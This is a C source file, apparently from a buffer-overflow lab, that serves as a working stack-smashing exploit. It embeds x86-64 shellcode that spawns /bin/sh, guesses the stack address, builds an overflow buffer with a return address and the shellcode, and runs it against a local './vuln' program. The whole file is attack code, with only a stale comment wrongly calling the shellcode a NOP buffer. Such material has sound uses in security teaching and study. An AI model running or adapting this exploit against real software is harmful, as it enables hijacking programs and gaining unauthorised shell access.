#include <stdio.h>
#include <string.h>
#include <unistd.h>
char shellcode[]="\x48\x31\xff\x57\x57\x5e\x5a\x48\xbf\x6a\x2f\x62\x69\x6e\x2f\x73\x68\x48\xc1\xef\x08\x57\x54\x5f\x6a\x3b\x58\x0f\x05";
//Replace the above NOP buffer with your shell code.

unsigned long get_sp(void) { 
  __asm__("movq %rsp,%rax"); 
} 

void main(int argc, char *argv[]) 
{ 
  int bsize=0, offset=0,i=0,j=0;
  char *buff, *ptr;
  long long *addr,*addr_ptr;
  if (argc == 1)
    {
      printf("\n\nUsage is either attack [buffer_size]\n or attack [buffer_size] [stack_offset]\n");
      exit(0);
    }
  if (argc > 1) bsize = atoi(argv[1]); 
  if (argc > 2) offset = atoi(argv[2]); 
      buff = malloc(bsize); 
      addr = get_sp() -offset;
      printf("\nUsing address as guess for beginning of attack buffer: 0x%x\n", addr); 
      ptr = buff; 
      addr_ptr = (long long *) ptr; 
      
      for (i = 0; i < bsize-8; i+=8) 
	*(addr_ptr++) = 0xFFFFFFFFFFFFFFFF; 
      *(addr_ptr)=addr;

      for (i = 0; i < strlen(shellcode); i++) 
	*(ptr++) = shellcode[i]; 
      
      buff[bsize - 1] = (char*)NULL; 
      
      execl("./vuln","./vuln", buff, NULL);
      return;
}
